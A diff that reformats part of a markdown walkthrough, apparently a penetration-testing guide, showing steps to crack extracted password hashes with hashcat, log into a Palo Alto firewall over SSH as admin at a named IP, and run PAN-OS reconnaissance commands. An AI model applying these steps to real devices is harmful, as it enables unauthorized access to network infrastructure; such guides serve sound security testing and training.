@@ -382,7 +382,7 @@ hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
 This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
    -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`
 
-6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running: 
+6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running:
 
 ```bash
 hashcat --show valid_hashes.txt
@@ -392,7 +392,7 @@ hashcat --show valid_hashes.txt
 
 8. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:
 
-```
+```bash
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38
 ```
 
@@ -406,9 +406,23 @@ In this section, we’ll perform network discovery using native PAN-OS commands 
 
 Additionally, we copy all outputs from coommands into a text document on our local machine for later review.
 
-1. Get Network Interfaces and copy them into a text file on your host machine: `show interface all`
-2. View routing table and copy into same created text file: `show routing route`
-3. Check arp table: `show arp all`
+1. Get Network Interfaces and copy them into a text file on your host machine:
+
+```bash
+show interface all
+```
+
+2. View routing table and copy into same created text file:
+
+```bash
+show routing route
+```
+
+3. Check arp table:
+
+```bash
+show arp all
+```
 
 #### Look for management configs or logs
 
